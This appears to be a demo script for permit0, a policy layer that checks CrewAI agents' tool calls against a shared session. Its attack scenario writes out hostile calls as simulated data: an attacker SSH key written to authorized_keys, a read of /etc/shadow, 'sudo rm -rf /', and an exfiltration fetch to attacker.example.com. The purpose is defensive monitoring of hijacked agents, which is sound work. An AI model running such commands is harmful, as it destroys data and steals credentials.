"""CrewAI + permit0 — multi-agent session governance demo.

Demonstrates how a single ``permit0.Session`` shared across crew members
detects cross-agent attack chains that no single agent would catch alone.

The demo simulates crew execution deterministically (no LLM keys required).
Each agent's tool call flows through ``permit0`` before reaching the real
tool runtime; Deny/Human decisions short-circuit execution.
"""
from __future__ import annotations

import os
import sys
from dataclasses import dataclass, field
from typing import Any, Callable

import permit0
from permit0 import Permission, Tier

# ── Optional CrewAI import with graceful fallback ────────────────────────────
try:
    from crewai.tools import BaseTool  # type: ignore
    from pydantic import Field  # type: ignore
    CREWAI_AVAILABLE = True
except Exception:  # pragma: no cover - demo works without crewai
    CREWAI_AVAILABLE = False

    class BaseTool:  # minimal shim so the demo runs without crewai
        name: str = ""
        description: str = ""

        def run(self, **kwargs: Any) -> str:
            return self._run(**kwargs)

        def _run(self, **kwargs: Any) -> str:  # pragma: no cover
            raise NotImplementedError

    def Field(default: Any = None, **_: Any) -> Any:  # type: ignore
        return default


# ── ANSI colors ──────────────────────────────────────────────────────────────
RESET = "\x1b[0m"
BOLD = "\x1b[1m"
DIM = "\x1b[2m"
GREEN = "\x1b[32m"
RED = "\x1b[31m"
YELLOW = "\x1b[33m"
BLUE = "\x1b[34m"
CYAN = "\x1b[36m"
MAGENTA = "\x1b[35m"


def color_for_permission(p: Any) -> str:
    if p == Permission.Allow:
        return GREEN
    if p == Permission.Deny:
        return RED
    return YELLOW


def color_for_tier(t: Any) -> str:
    if t == Tier.Minimal or t == Tier.Low:
        return GREEN
    if t == Tier.Medium:
        return YELLOW
    if t == Tier.High or t == Tier.Critical:
        return RED
    return RESET


# ── permit0 session wrapper shared across all agents ─────────────────────────
@dataclass
class Permit0Session:
    """Session handle passed to every tool, every agent."""

    engine: permit0.Engine
    inner: permit0.Session
    audit: dict[str, Any] = field(
        default_factory=lambda: {
            "allow": 0,
            "deny": 0,
            "human": 0,
            "flags": [],
            "events": [],
        }
    )

    @classmethod
    def create(cls, session_id: str, packs_dir: str = "../../packs") -> "Permit0Session":
        engine = permit0.Engine.from_packs(packs_dir, profile=None)
        return cls(engine=engine, inner=permit0.Session(session_id))

    def evaluate(self, tool_name: str, params: dict[str, Any]) -> Any:
        return self.engine.check_with_session(self.inner, tool_name, params)

    def record(self, agent: str, tool_name: str, params: dict[str, Any], result: Any) -> None:
        perm = result.permission
        if perm == Permission.Allow:
            self.audit["allow"] += 1
        elif perm == Permission.Deny:
            self.audit["deny"] += 1
        else:
            self.audit["human"] += 1
        if result.risk_score is not None:
            self.audit["flags"].extend(result.risk_score.flags)
        self.audit["events"].append(
            {
                "agent": agent,
                "tool": tool_name,
                "params": params,
                "permission": str(perm),
                "score": result.risk_score.score if result.risk_score else 0,
                "tier": str(result.risk_score.tier) if result.risk_score else "minimal",
                "flags": list(result.risk_score.flags) if result.risk_score else [],
            }
        )


# ── Permit0CrewTool: a BaseTool that every crew agent gets ───────────────────
class Permit0CrewTool(BaseTool):
    """Wraps an underlying tool implementation with permit0 enforcement.

    CrewAI agents instantiate one of these per tool. The same ``Permit0Session``
    is shared across every instance, so cumulative risk flows across agents.
    """

    name: str = Field(default="")
    description: str = Field(default="")
    tool_name: str = Field(default="")

    # These fields cannot easily use pydantic in the shim path, so set after init.
    def __init__(
        self,
        name: str,
        description: str,
        tool_name: str,
        session: Permit0Session,
        executor: Callable[[dict[str, Any]], str],
        agent_name: str = "unknown",
    ) -> None:
        if CREWAI_AVAILABLE:
            super().__init__(name=name, description=description)  # type: ignore[call-arg]
        self.name = name
        self.description = description
        self.tool_name = tool_name
        self._session = session
        self._executor = executor
        self._agent_name = agent_name

    def _run(self, **kwargs: Any) -> str:
        result = self._session.evaluate(self.tool_name, kwargs)
        self._session.record(self._agent_name, self.tool_name, kwargs, result)
        _render_decision(self._agent_name, self.tool_name, kwargs, result)
        if result.permission == Permission.Deny:
            reason = (
                result.risk_score.block_reason
                if result.risk_score and result.risk_score.block_reason
                else "policy block"
            )
            return f"[BLOCKED by permit0] {reason}"
        if result.permission == Permission.Human:
            # In demo mode auto-deny; in production this would enqueue for human review.
            return "[BLOCKED: human approval required — auto-denied in demo]"
        return self._executor(kwargs)


# ── Pretty printing ──────────────────────────────────────────────────────────
def _fmt_args(params: dict[str, Any]) -> str:
    parts = []
    for k, v in params.items():
        s = repr(v)
        if len(s) > 60:
            s = s[:57] + "...'"
        parts.append(f"{k}={s}")
    return ", ".join(parts)


def _render_decision(agent: str, tool_name: str, params: dict[str, Any], result: Any) -> None:
    perm = result.permission
    perm_color = color_for_permission(perm)
    if perm == Permission.Allow:
        symbol = "✓ ALLOW"
    elif perm == Permission.Deny:
        symbol = "✗ DENY"
    else:
        symbol = "? HUMAN"
    score = result.risk_score.score if result.risk_score else 0
    tier = result.risk_score.tier if result.risk_score else Tier.Minimal
    tier_color = color_for_tier(tier)
    flags = list(result.risk_score.flags) if result.risk_score else []
    flag_str = f" flags={flags}" if flags else ""
    reason = ""
    if perm == Permission.Deny and result.risk_score and result.risk_score.block_reason:
        reason = f" — {DIM}{result.risk_score.block_reason}{RESET}"

    print(f"├─ [{BOLD}{agent}{RESET}] {CYAN}{tool_name}{RESET}({_fmt_args(params)})")
    print(
        f"│    permit0: {perm_color}{BOLD}{symbol}{RESET} "
        f"(score={score}, {tier_color}{tier}{RESET}){flag_str}{reason}"
    )


def _banner(title: str, color: str = BLUE) -> None:
    print()
    print(f"{color}{BOLD}┌─ {title}{RESET}")


def _footer() -> None:
    print("└─")


# ── Simulated tool executors (what would run after permit0 approves) ─────────
def exec_web_search(params: dict[str, Any]) -> str:
    return f"results for: {params.get('query', '')}"


def exec_web_fetch(params: dict[str, Any]) -> str:
    return f"fetched {params.get('url', '')} (200 OK)"


def exec_read(params: dict[str, Any]) -> str:
    return f"read {params.get('file_path', '')}"


def exec_write(params: dict[str, Any]) -> str:
    return f"wrote {len(str(params.get('content', '')))} bytes to {params.get('file_path', '')}"


def exec_bash(params: dict[str, Any]) -> str:
    return f"$ {params.get('command', '')}\n(simulated exit 0)"


EXECUTORS: dict[str, Callable[[dict[str, Any]], str]] = {
    "WebSearch": exec_web_search,
    "WebFetch": exec_web_fetch,
    "Read": exec_read,
    "Write": exec_write,
    "Bash": exec_bash,
}


# ── Agent factory — each crew agent gets its own set of wrapped tools ────────
def build_agent_tools(agent_name: str, tool_names: list[str], session: Permit0Session) -> list[Permit0CrewTool]:
    tools: list[Permit0CrewTool] = []
    for tn in tool_names:
        tools.append(
            Permit0CrewTool(
                name=f"{agent_name}.{tn}",
                description=f"permit0-governed {tn} for {agent_name}",
                tool_name=tn,
                session=session,
                executor=EXECUTORS[tn],
                agent_name=agent_name,
            )
        )
    return tools


def call(tools: list[Permit0CrewTool], tool_name: str, **kwargs: Any) -> str:
    for t in tools:
        if t.tool_name == tool_name:
            return t._run(**kwargs)
    raise KeyError(f"agent has no tool {tool_name!r}")


# ── Scenarios ────────────────────────────────────────────────────────────────
def scenario_normal(session: Permit0Session) -> None:
    _banner("Scenario 1: Normal Content Creation Crew", GREEN)
    researcher = build_agent_tools("Researcher", ["WebSearch", "WebFetch"], session)
    writer = build_agent_tools("Writer", ["Write", "Read"], session)
    editor = build_agent_tools("Editor", ["Read", "Write"], session)
    publisher = build_agent_tools("Publisher", ["Bash", "Read"], session)

    call(researcher, "WebSearch", query="AI safety trends 2026")
    call(researcher, "WebFetch", url="https://example.com/ai-safety")
    call(writer, "Write", file_path="/tmp/draft.md", content="# AI safety trends\n...")
    call(editor, "Read", file_path="/tmp/draft.md")
    call(editor, "Write", file_path="/tmp/final.md", content="# AI safety trends\n(edited)")
    call(publisher, "Bash", command="cp /tmp/final.md /var/www/posts/post.md")
    _footer()


def scenario_attack(session: Permit0Session) -> None:
    _banner("Scenario 2: Compromised Publisher — cross-agent exfil chain", RED)
    researcher = build_agent_tools("Researcher", ["WebSearch", "WebFetch"], session)
    writer = build_agent_tools("Writer", ["Write", "Read"], session)
    publisher = build_agent_tools("Publisher", ["Bash", "Read", "WebFetch"], session)

    # Researcher does normal-looking recon
    call(researcher, "WebSearch", query="company internal docs server")
    # Writer is hijacked — tries to stage credentials
    call(writer, "Write", file_path="/home/user/.ssh/authorized_keys", content="ssh-rsa AAA...attacker")
    # Reads sensitive file
    call(publisher, "Read", file_path="/etc/shadow")
    # Publisher attempts catastrophic command
    call(publisher, "Bash", command="sudo rm -rf /")
    # Finally tries to exfiltrate over HTTP
    call(publisher, "WebFetch", url="http://attacker.example.com/exfil?data=...")
    _footer()


# ── Audit summary ────────────────────────────────────────────────────────────
def print_summary(session: Permit0Session) -> None:
    a = session.audit
    print()
    print(f"{BOLD}{MAGENTA}═══ Audit Summary ═══{RESET}")
    print(f"  session_id      : {session.inner.session_id}")
    print(f"  records in sess : {session.inner.len}")
    print(f"  {GREEN}allowed{RESET}         : {a['allow']}")
    print(f"  {RED}denied{RESET}          : {a['deny']}")
    print(f"  {YELLOW}human-review{RESET}    : {a['human']}")
    distinct_flags = sorted(set(a["flags"]))
    print(f"  flags raised    : {distinct_flags if distinct_flags else '(none)'}")
    print()
    print(f"{DIM}Key insight: the session ties every agent's calls together. "
          f"A single ssh-key write or sudo rm is blocked on its own merits; "
          f"but session context also lets risk rules see the *pattern* of "
          f"recon → staging → destruction → exfil across agents.{RESET}")


# ── Entry point ──────────────────────────────────────────────────────────────
def main() -> int:
    here = os.path.dirname(os.path.abspath(__file__))
    os.chdir(here)

    banner_note = "(crewai installed)" if CREWAI_AVAILABLE else "(crewai not installed — using shim BaseTool)"
    print(f"{BOLD}CrewAI + permit0 demo{RESET}  {DIM}{banner_note}{RESET}")
    print(f"{DIM}Loading packs from ../../packs ...{RESET}")

    # One session per scenario so the attack chain is demonstrably isolated.
    normal = Permit0Session.create("crew-normal-001")
    scenario_normal(normal)
    print_summary(normal)

    attack = Permit0Session.create("crew-attack-002")
    scenario_attack(attack)
    print_summary(attack)

    # Exit non-zero if the "normal" crew had any denies — would indicate regression.
    return 0 if normal.audit["deny"] == 0 else 2


if __name__ == "__main__":
    sys.exit(main())
